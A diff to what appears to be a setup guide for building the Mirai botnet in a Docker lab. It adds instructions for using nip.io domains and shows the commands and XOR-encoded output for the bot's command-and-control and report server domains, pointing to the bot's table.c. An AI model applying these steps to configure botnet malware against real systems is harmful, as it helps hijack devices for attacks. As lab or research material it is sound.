@@ -45,18 +45,20 @@ XOR'ing 20 bytes of data...
 \x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22
 ```
 
-<!--
+If you don't have a domain, build a DNS server locally, or use a service like [`nip.io`](https://nip.io/).
+`nip.io` is a simple DNS service that returns an IP written on a domain address.
+For example, `some-string-11-22-33-44.nip.io` resolves to `11.22.33.44`.
 ```
-$ docker compose run compile ./enc.sh string cnc-10-20-0-10.nip.io
+$ docker compose run compile ./enc.sh string cnc-172-20-0-3.nip.io
 XOR'ing 22 bytes of data...
-\x41\x4C\x41\x0F\x13\x12\x0F\x10\x12\x0F\x12\x0F\x13\x12\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
+\x41\x4C\x41\x0F\x13\x15\x10\x0F\x10\x12\x0F\x12\x0F\x11\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
 ```
 ```
-$ docker compose run compile ./enc.sh string report-10-20-0-10.nip.io
+$ docker compose run compile ./enc.sh string report-172-20-0-4.nip.io
 XOR'ing 25 bytes of data...
-\x50\x47\x52\x4D\x50\x56\x0F\x13\x12\x0F\x10\x12\x0F\x12\x0F\x13\x12\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
+\x50\x47\x52\x4D\x50\x56\x0F\x13\x15\x10\x0F\x10\x12\x0F\x12\x0F\x16\x0C\x4C\x4B\x52\x0C\x4B\x4D\x22
 ```
--->
+
 
 ## 05. Configure bot
 Edit some domains in [./src/mirai/bot/table.c](./src/mirai/bot/table.c)
